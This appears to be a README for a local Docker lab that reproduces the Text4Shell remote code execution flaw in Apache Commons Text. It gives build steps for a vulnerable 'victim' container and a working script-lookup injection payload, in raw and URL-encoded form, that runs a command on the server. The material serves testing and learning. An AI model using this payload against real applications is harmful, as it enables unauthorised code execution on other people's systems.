### Build and run
-------------


1. Docker build

```
docker build -t text4shell .
```

2. Docker run

```
docker run -p 80:8080 --name t4s_victim text4shell
```

3. Test the app

```
http://localhost/text4shell/attack?search=<anything>
```

4. Attack can be performed by passing a string “${prefix:name}” where the prefix is the aforementioned lookup:

```
${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
```

http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D

5. Check the result inside the container

```
docker exec -it t4s_victim bash
ls /tmp
```

6. You can also try using `dns` or `url` prefixes.

7. To check if above RCE was successful (You should see a file named `foo` created in the `/tmp` directory):

```
ls /tmp/
```

8. To stop the container

```
docker container stop t4s_victim
```
